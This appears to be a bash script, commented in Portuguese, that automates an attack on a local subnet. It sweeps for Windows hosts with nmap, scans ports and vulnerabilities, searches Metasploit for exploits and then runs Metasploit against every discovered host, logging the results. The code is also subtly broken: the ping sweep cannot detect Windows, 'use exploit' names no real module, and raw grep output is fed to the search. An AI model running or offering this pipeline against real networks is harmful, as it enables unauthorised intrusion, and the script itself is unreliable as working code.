#!/bin/bash

# Define a rede a ser varrida
network="192.168.0.0/24"

# Realiza a varredura na rede para encontrar hosts Windows
echo "Realizando a varredura na rede para encontrar hosts Windows..."
nmap -sn $network -oG - | awk '/Up/ && /Windows/ {print $2}' > windows_hosts.txt

# Realiza a identificação das portas abertas nos hosts encontrados
echo "Realizando a identificação das portas abertas nos hosts encontrados..."
nmap -p- -sS -T4 -v -n -iL windows_hosts.txt -oN open_ports.txt

# Realiza a identificação das vulnerabilidades no sistema operacional Windows
echo "Realizando a identificação das vulnerabilidades no sistema operacional Windows..."
nmap -sS -sV --script vuln -iL windows_hosts.txt -oN windows_vulns.txt

# Analisa o arquivo de texto com as vulnerabilidades encontradas para selecionar as vulnerabilidades mais críticas
echo "Analisando as vulnerabilidades encontradas para selecionar as mais críticas..."
critical_vulns=$(grep "Critical" windows_vulns.txt)

# Verifica a disponibilidade dos exploits para as vulnerabilidades selecionadas no Metasploit
echo "Verificando a disponibilidade dos exploits no Metasploit..."
msfconsole -q -x "search $critical_vulns; exit" > exploit_info.txt

# Explora as vulnerabilidades nos hosts selecionados usando o Metasploit
echo "Explorando as vulnerabilidades nos hosts selecionados usando o Metasploit..."
msfconsole -q -x "use exploit; set RHOSTS $(cat windows_hosts.txt | tr '\n' ','); run; exit" > exploit_results.txt

# Registra as informações da exploração em um arquivo de texto
echo "Registrando as informações da exploração em um arquivo de texto..."
cat exploit_results.txt >> exploitation.log
